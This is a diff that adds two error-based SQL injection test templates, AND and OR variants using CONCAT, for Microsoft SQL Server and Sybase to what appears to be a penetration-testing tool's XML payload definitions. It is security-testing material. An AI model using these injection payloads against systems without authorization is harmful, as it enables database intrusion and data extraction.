@@ -389,6 +389,48 @@
     </test>
 
     <test>
+        <title>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
         <title>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)</title>
         <stype>2</stype>
         <level>2</level>
